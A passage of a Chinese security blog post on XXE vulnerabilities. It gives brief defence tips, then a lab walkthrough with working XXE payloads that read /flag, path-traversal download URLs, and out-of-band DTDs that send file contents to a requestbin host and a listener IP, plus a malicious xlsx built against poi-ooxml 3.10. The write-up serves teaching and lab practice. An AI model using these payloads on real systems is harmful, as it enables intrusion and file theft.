+<li><strong>Java:</strong><br>DocumentBuilderFactorydbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</li>
+</ul>
+<p><strong>不推荐：过滤用户提交的XML数据</strong><br>关键词：<br><code>&lt;!DOCTYPE</code>和<code>&lt;!ENTITY</code>或者<code>SYSTEM</code>和<code>PUBLIC</code></p>
+<h1 id="XXE实战"><a href="#XXE实战" class="headerlink" title="XXE实战"></a>XXE实战</h1><h2 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h2><h3 id="http-10-20-25-44-180-xxe-读取-flag"><a href="#http-10-20-25-44-180-xxe-读取-flag" class="headerlink" title="http://10.20.25.44:180/ xxe 读取/flag"></a><a href="http://10.20.25.44:180/" target="_blank" rel="noopener">http://10.20.25.44:180/</a> xxe 读取/flag</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE XXE[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY XXE SYSTEM "file:///flag" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;XXE;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/20200805142425.png" alt="20200805142425"></p>
+<h3 id="http-10-20-25-44-180-flag-php-读一下-flag-php"><a href="#http-10-20-25-44-180-flag-php-读一下-flag-php" class="headerlink" title="http://10.20.25.44:180/flag.php 读一下 flag.php"></a><a href="http://10.20.25.44:180/flag.php" target="_blank" rel="noopener">http://10.20.25.44:180/flag.php</a> 读一下 flag.php</h3><blockquote>
+<p><code>php://filter/convert.base64-encode/resource=flag.php</code> 这里不能直接访问所以需要base64编码绕过</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE XXE[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY XXE SYSTEM "php://filter/convert.base64-encode/resource=flag.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;XXE;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://qiniuyun.lintstar.top/20200805143227.png" alt="20200805143227"></p>
+<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><h3 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h3><p><a href="http://10.20.25.44:181/" target="_blank" rel="noopener">http://10.20.25.44:181/</a> 读 /flag</p>
+<blockquote>
+<p>xxe 无回显原理为你要想办法查看你读取到的文件内容，但没有回显。要想办法获取读取到的文件，这时需要想办法向外发送一个网络请求，请求中则带上该文件的内容，接收到该请求则可以拿到文件内容。</p>
+</blockquote>
+<p>REQUEST平台：<br><strong><a href="http://http.requestbin.buuoj.cn/" target="_blank" rel="noopener">http://http.requestbin.buuoj.cn/</a></strong></p>
+<p>在没有回显的情况下，把信息发到外面的服务器</p>
+<p>去上面的REQUEST平台生成链接</p>
+<p><img src="http://qiniuyun.lintstar.top/20200805161146.png" alt="20200805161146"></p>
+<p>所以首先定义一个file实体，填入链接：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///flag</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://http.requestbin.buuoj.cn/umc930um？p=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>作用是被目标服务器的 XML 解析器解析而后读取文件和拼接到实体参数里外发请求。</p>
+</blockquote>
+<p><img src="http://qiniuyun.lintstar.top/20200805161421.png" alt="20200805161421"></p>
+<blockquote>
+<p><code>python -m SimpleHTTPServer 8081</code>开启8081的web服务器</p>
+</blockquote>
+<p>开启外部服务器，把test.dtd放到根目录下</p>
+<p>构造payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE dasctf[</span></span><br><span class="line"><span class="meta">        &lt;!ENTITY % remote SYSTEM "http://10.14.0.81/test.dtd" &gt;</span></span><br><span class="line"><span class="meta">        %remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">books</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">name</span>&gt;</span>abc<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">books</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>开头处定义首先引入上面我们的 dtd 文件，%remote 使其中的内容被解析且定义，再调用 %int 使得 %send 被定义，%send 被定义之后即可被调用，最后调用 %send 外发请求。<br>ip是本地地址</p>
+</blockquote>
+<p>然后post这个payload ，报错会回显flag：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">file:///flag</span>"&gt;</span></span><br></pre></td></tr></table></figure>
+<p>同时flag也会发给REQUEST平台。</p>
+<h3 id="poi-ooxml-3-10-XXE-漏洞"><a href="#poi-ooxml-3-10-XXE-漏洞" class="headerlink" title="poi-ooxml-3.10 XXE 漏洞"></a>poi-ooxml-3.10 XXE 漏洞</h3><p><a href="http://10.20.25.44:1180/" target="_blank" rel="noopener">http://10.20.25.44:1180/</a>  拿到 flag</p>
+<p>提示：</p>
+<blockquote>
+<ul>
+<li>路径穿越下载 Java 源码。<ul>
+<li><code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../web.xml&gt;</code></li>
+<li><code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/ListFileServlet.class&gt;</code></li>
+<li><code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/DownloadServlet.class&gt;</code></li>
+<li><code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=../../../classes/cn/abc/servlet/UploadServlet.class&gt;</code></li>
+</ul>
+</li>
+<li>JD-GUI 审计代码</li>
+<li>查看依赖库存在的 XXE 漏洞上传文件触发 XXE 漏洞读取到 flag</li>
+</ul>
+</blockquote>
+<p><img src="http://qiniuyun.lintstar.top/image-20200809204742658.png" alt="image-20200809204742658"></p>
+<p>随便上出传一个文件，找到下载地址：<code>&lt;http://10.20.25.44:1180/DownloadServlet?filename=29b475f2-dc80-4985-840d-11844edab662_a.sh&gt;</code></p>
+<p>尝试路径穿越下载java代码，读取下来之后，用 jd-cli 去分析。</p>
+<p><img src="http://qiniuyun.lintstar.top/image-20200809205525204.png" alt="image-20200809205525204"></p>
+<p>看到里面对 excel- 开头的 xlsx 文件单独处理，有用到 poi-ooxml-3.10 这个库。</p>
+<p><img src="http://qiniuyun.lintstar.top/image-20200809215451075.png" alt="image-20200809215451075"></p>
+<p>搜索其中可能存在漏洞。找到存在 xxe 漏洞。</p>
+<p><img src="http://qiniuyun.lintstar.top/20200810222808.png" alt="20200810222808"></p>
+<p>那么来先把本地的dtd文件 test3.dtd 构造好。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://http.requestbin.buuoj.cn/10s0ntp1?a=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure>
+<p>服务器打开来对外发送这个文件。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">8887</span> -t ./</span><br></pre></td></tr></table></figure>
+<p>之后就可以构造一个恶意的 excel 传送上去。首先创建并解压一个 xlsx。</p>
+<p><img src="http://qiniuyun.lintstar.top/image-20200809232712531.png" alt="image-20200809232712531"></p>
+<p>修改 [Content_Types].xml，将其中的内容改为引入外部实体读取并外带文件内容的 XXE Payload。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % remote SYSTEM "http://10.14.0.20:8887/test3.dtd"&gt;</span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>保存好重新压缩,命令是：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r ../excel-exp.xlsx ./</span><br></pre></td></tr></table></figure>
+<p>传上去，即可接收到 /flag 的内容：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200810223201.png" alt="20200810223201"></p>
+<p>REQUEST平台也收到了请求：</p>
+<p><img src="http://qiniuyun.lintstar.top/20200810223237.png" alt="20200810223237"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/note/2020/undefined10/cb4d799d.html" rel="next" title="PHP命令执行漏洞">
+                <i class="fa fa-chevron-left"></i> PHP命令执行漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/note/2020/undefined12/fd61bb58.html" rel="prev" title="反序列化漏洞">
+                反序列化漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="离沫凌天๓">
+            
+              <p class="site-author-name" itemprop="name">离沫凌天๓</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE-漏洞"><span class="nav-number">1.</span> <span class="nav-text">XXE 漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE漏洞概述"><span class="nav-number">2.</span> <span class="nav-text">XXE漏洞概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是XML"><span class="nav-number">2.1.</span> <span class="nav-text">什么是XML</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是DTD"><span class="nav-number">2.2.</span> <span class="nav-text">什么是DTD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一个完整的XML例子"><span class="nav-number">2.2.1.</span> <span class="nav-text">一个完整的XML例子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#何谓XXE"><span class="nav-number">2.3.</span> <span class="nav-text">何谓XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#如何构造实体注入"><span class="nav-number">2.4.</span> <span class="nav-text">如何构造实体注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE漏洞探测技巧"><span class="nav-number">3.</span> <span class="nav-text">XXE漏洞探测技巧</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#如何确认XXE漏洞存在"><span class="nav-number">3.1.</span> <span class="nav-text">如何确认XXE漏洞存在</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE漏洞利用方式"><span class="nav-number">4.</span> <span class="nav-text">XXE漏洞利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE漏洞利用方式分类"><span class="nav-number">4.1.</span> <span class="nav-text">XXE漏洞利用方式分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#有回显-读取文件-SSRF-Phar"><span class="nav-number">4.2.</span> <span class="nav-text">有回显-读取文件/SSRF/Phar</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无回显-读取文件-SSRF-Phar"><span class="nav-number">4.3.</span> <span class="nav-text">无回显-读取文件/SSRF/Phar</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE漏洞防御方式"><span class="nav-number">5.</span> <span class="nav-text">XXE漏洞防御方式</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE实战"><span class="nav-number">6.</span> <span class="nav-text">XXE实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#有回显"><span class="nav-number">6.1.</span> <span class="nav-text">有回显</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#http-10-20-25-44-180-xxe-读取-flag"><span class="nav-number">6.1.1.</span> <span class="nav-text">http://10.20.25.44:180/ xxe 读取/flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http-10-20-25-44-180-flag-php-读一下-flag-php"><span class="nav-number">6.1.2.</span> <span class="nav-text">http://10.20.25.44:180/flag.php 读一下 flag.php</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#无回显"><span class="nav-number">6.2.</span> <span class="nav-text">无回显</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#XML外部实体注入"><span class="nav-number">6.2.1.</span> <span class="nav-text">XML外部实体注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poi-ooxml-3-10-XXE-漏洞"><span class="nav-number">6.2.2.</span> <span class="nav-text">poi-ooxml-3.10 XXE 漏洞</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离沫凌天๓</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+-->
+
+<div class="busuanzi-count">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+    来访人数：<span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+    访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+    全站字数：<span class="post-count">115.8k</span>
+    </span>
+</div>
+
+
+
+
+
+<div class="BbeiAn-info">
+   	<!--津ICP备  -->
+    <a target="_blank" href="http://www.beian.miit.gov.cn/" style="color:#f0d784" rel="nofollow">津ICP备18005284</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->| 
+	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011102000578" style="color:#f0d784;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">津公网安备12011102000578号</a>	  <!--这里将图标作为了背景，以使得能和后面的文字在同一行-->
+</div>
+
+<!--
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+-->
+
+
+
+<!-- 在网页底部添加网站运行时间 -->
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/21/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "Run for "+dnum+" Days ";
+        document.getElementById("times").innerHTML = hnum + " Hours " + mnum + " m " + snum + " s";
+    }
+setInterval("createtime()",250);
+</script>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
